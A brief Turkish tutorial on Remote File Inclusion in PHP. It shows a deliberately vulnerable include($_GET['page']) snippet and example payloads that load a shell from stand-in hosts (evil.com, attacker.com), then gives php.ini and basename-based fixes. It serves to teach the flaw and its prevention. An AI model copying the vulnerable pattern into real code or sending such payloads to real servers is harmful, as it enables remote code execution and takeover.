# RFI Nedir
RFI (Remote File Inclusion), uzak bir sunucudaki dosyanın hedef uygulamaya include edilmesi ile ortaya çıkan bir zafiyet türüdür. Genellikle PHP gibi dinamik olarak dosya çağırabilen dillerde görülür. Uygulama, kullanıcıdan gelen bir parametreyi include(), require() gibi fonksiyona doğrudan dosya olarak çağırırsa ve geliştirici herhangi bir input validation / whitelist kontrolü yapmamışsa, saldırgan http://evil.com/shell.php gibi bir URL göndererek kendi dosyasını çalıştırabilir.

Örnek Zafiyetli Kod:
```php
<?php
$page = $_GET['page'];
include($page . ".php");
?>
```

Normalde ?page=home → include("home.php"); çalışır ancak filtre yoksa:
```
?page=http://attacker.com/shell
```

Uzak dosya çekilir ve sunucu üzerinde saldırgan’ın kodu çalışır.

# RFI Zafiyetini Önlemek
php.ini ayarları aşağıdaki gibi yapılırsa uzak dosya çağırmayı tamamen engeller.
```
allow_url_fopen = Off
allow_url_include = Off
```

Absolute path:
```php
include("/var/www/html/pages/" . basename($_GET['page']) . ".php");
```
